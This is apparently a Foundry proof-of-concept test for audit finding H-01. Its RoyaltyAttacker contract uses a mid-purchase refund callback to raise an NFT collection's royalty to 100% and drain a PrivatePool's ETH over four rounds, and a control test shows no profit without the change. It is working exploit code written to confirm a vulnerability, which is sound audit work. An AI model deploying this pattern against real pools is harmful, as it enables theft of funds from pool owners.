// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./PocBase.sol";

// Judged finding H-01: "Royalty receiver can drain a private pool".
// PrivatePool.buy reads the royalty twice: once to price the purchase, once to pay it out.
// Between the two reads it sends ETH to the buyer (the excess refund), so a buyer who also
// controls the collection's royalty can raise it after being charged and before being paid.
contract RoyaltyAttacker {
    RoyaltyCollection internal immutable nft;
    PrivatePool internal pool;
    bool internal raiseRoyaltyOnRefund;

    constructor() {
        nft = new RoyaltyCollection(address(this));
    }

    function collection() external view returns (RoyaltyCollection) {
        return nft;
    }

    function round(PrivatePool _pool, uint256 tokenId, bool exploit) external {
        pool = _pool;
        uint256[] memory ids = new uint256[](1);
        ids[0] = tokenId;
        PrivatePool.MerkleMultiProof memory proof = PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0));

        // Buy with the royalty at 0, overpaying by 1 wei so the pool refunds us mid-function.
        (uint256 cost,,) = pool.buyQuote(1e18);
        raiseRoyaltyOnRefund = exploit;
        pool.buy{value: cost + 1}(ids, ids, proof);

        // Sell the NFT straight back with the royalty at 0 again.
        nft.setRoyaltyBps(0);
        nft.setApprovalForAll(address(pool), true);
        pool.sell(ids, ids, proof, new IStolenNftOracle.Message[](0));
    }

    receive() external payable {
        // The 1 wei refund arrives after the charge and before the royalty payout.
        if (raiseRoyaltyOnRefund && msg.sender == address(pool) && msg.value == 1) {
            raiseRoyaltyOnRefund = false;
            nft.setRoyaltyBps(10_000);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract H01_RoyaltyDrain is PocBase {
    RoyaltyAttacker internal attacker;
    PrivatePool internal pool;
    uint256[] internal poolTokenIds;

    function setUp() public {
        attacker = new RoyaltyAttacker();
        (pool, poolTokenIds) = _createEthPool(attacker.collection(), 0, true, "h01");
        vm.deal(address(attacker), 3 ether);
    }

    function test_H01_royaltyRecipientDrainsPool() public {
        assertEq(address(pool).balance, 10 ether);

        for (uint256 i; i < 4; i++) {
            attacker.round(pool, poolTokenIds[0], true);
        }

        // Measured: the pool owner's 10 ETH is gone, the attacker holds it, the pool still holds all 5 NFTs.
        assertEq(address(pool).balance, 0, "pool ETH drained");
        assertEq(address(attacker).balance, 13 ether, "attacker gained the pool's 10 ETH");
        assertEq(attacker.collection().balanceOf(address(pool)), 5, "pool NFT inventory unchanged");
    }

    // Control: the identical buy-then-sell round without the mid-function royalty change makes no profit.
    function test_H01_control_noProfitWithoutRoyaltyChange() public {
        attacker.round(pool, poolTokenIds[0], false);

        assertEq(address(pool).balance, 10 ether, "pool ETH intact");
        assertEq(address(attacker).balance, 3 ether, "no attacker profit");
    }
}
